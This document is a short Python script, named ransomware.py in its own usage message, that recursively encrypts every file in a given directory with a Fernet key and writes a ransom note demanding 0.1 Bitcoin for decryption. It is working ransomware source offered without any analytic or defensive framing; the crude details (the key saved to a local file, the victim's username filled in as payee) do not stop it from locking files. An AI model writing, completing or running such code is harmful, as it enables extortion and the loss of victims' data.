import os, cryptography, sys, getpass
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def generate_key():
    return Fernet.generate_key()

def main():
    if len(sys.argv) < 2:
        print("Usage: python ransomware.py <directory>")
        sys.exit(0)

    directory = sys.argv[1]

    key = generate_key()

    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)

    ransom_note = f"""
Your files have been encrypted.
To restore access, send {getpass.getuser()} 0.1 Bitcoin to the following address: [insert Bitcoin address]
Once the payment has been confirmed, you will receive the decryption key.
"""

    with open("ransom_note.txt", "w") as ransom_note_file:
        ransom_note_file.write(ransom_note)

if __name__ == "__main__":
    main()
